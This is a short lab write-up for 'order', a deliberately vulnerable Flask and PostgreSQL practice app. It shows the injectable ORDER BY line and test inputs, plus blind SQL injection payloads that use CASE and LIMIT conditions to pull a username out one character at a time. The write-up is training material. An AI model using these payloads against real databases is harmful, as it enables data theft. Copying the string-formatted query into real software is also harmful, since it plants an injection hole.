## Order

https://github.com/bmdyy/order

A small app written in Python (Flask) and PostgreSQL to practice blind SQLi in the ORDER BY clause.

If you have problems starting the docker, add this one the beggining of Dockerfile: `ENV PIP_BREAK_SYSTEM_PACKAGES 1`

The vulnerability occurs on line 32 of app.py.
```
cur.execute("SELECT * FROM horses ORDER BY %s"%(order_by))
```

We can test the injection with:
```
1 ASC --
1 DESC --
```

We can follow the logic of [this article](https://portswigger.net/support/sql-injection-in-the-query-structure) to exploit the vulnerability.

With the payload above, the logic is: If the string is true, the order will filter by Name, otherwise it will filtered by Description.
```
(CASE WHEN (SELECT ASCII(SUBSTRING(username, 1, 1)) FROM users where user_id = '2')=98 THEN Name ELSE Description END)
```

In the **exploit.py**, we filter the first occurrence of <td> that contains the result. If it's Aaron, this means that the order is filtered by Name and we found the character.

The author exploit uses, since the content-length differ from "order by 1" and "order by 2".
```
sqli = "2 LIMIT (CASE WHEN (%s) THEN 1 ELSE 2 END)"
```
